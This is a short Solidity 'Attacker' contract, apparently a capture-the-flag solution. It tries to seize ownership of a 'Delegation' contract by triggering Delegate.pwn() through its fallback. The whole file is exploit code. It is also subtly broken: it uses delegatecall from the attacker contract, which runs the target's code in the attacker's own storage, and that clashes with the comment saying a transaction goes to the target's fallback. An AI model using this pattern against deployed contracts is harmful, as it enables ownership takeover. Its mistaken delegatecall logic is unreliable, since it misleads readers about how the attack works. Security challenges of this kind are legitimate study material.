pragma solidity ^0.8.0;

contract Attacker {
    address immutable delegationInstance;

    constructor(address _delegationInstance) {
        delegationInstance = _delegationInstance;
    }

    function exploit() external {
        // Send a transaction to Delegation's fallback function with data matching Delegate.pwn()
        // This will trigger fallback handling in Delegation
        (bool success,) = delegationInstance.delegatecall(abi.encodeWithSignature("pwn()"));
        require(success, "Delegate call failed");
    }
}